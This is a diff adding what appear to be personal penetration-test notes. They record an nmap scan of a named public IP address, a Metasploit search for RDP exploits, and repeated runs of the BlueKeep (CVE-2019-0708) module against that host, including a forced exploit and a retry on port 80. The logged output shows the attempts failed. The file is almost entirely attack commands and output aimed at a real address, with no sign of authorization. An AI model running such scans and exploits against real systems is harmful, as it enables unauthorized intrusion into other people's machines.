@@ -1,0 +1,46 @@
+54.221.143.148
+
+step 1: NMAP SCAN
+	Nmap done: 1 IP address (1 host up) scanned in 57.10 seconds
+	Raw packets sent: 2246 (104.428KB) | Rcvd: 1926 (77.044KB)
+   	
+	Discovered open port 80/tcp on 54.221.143.148
+	Discovered open port 443/tcp on 54.221.143.148
+	Discovered open port 3389/tcp on 54.221.143.148
+
+step 2:	searching for exploits
+	sudo msfconsole
+	search exploit RDB
+	
+	Results:
+	1.	15  exploit/windows/rdp/rdp_doublepulsar_rce
+		2017-04-14     great      Yes
+		RDP DOUBLEPULSAR Remote Code Execution
+	
+	2. 	5   exploit/windows/rdp/cve_2019_0708_bluekeep_rce                 		2019-05-14       manual     Yes    
+		CVE-2019-0708 BlueKeep RDP Remote Windows Kernel Use After Free
+
+
+step 3: exploiting using 5 exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+	use exploit/windows/rdp/cve_2019_0708_bluekeep_rce 
+	show options
+	set set RDP_CLIENT_IP 54.221.143.148
+	set RHOSTS 54.221.143.148
+	exploit
+
+	Results:
+		[*] 54.221.143.148:3389 - Scanned 1 of 1 hosts (100% complete)
+		[!] 54.221.143.148:3389 - The target is not exploitable.
+		ForceExploit is enabled, proceeding with exploitation.
+		[-] 54.221.143.148:3389 - Exploit aborted due to failure:
+		bad-config: Set the most appropriate target manually.
+		If you are targeting 2008, make sure fDisableCam=0 !
+		[*] Exploit completed, but no session was created.
+	
+	set ForceExploit true
+	exploit (same result)
+	set RPORT 80
+	exploit (same result)
+
+
+	
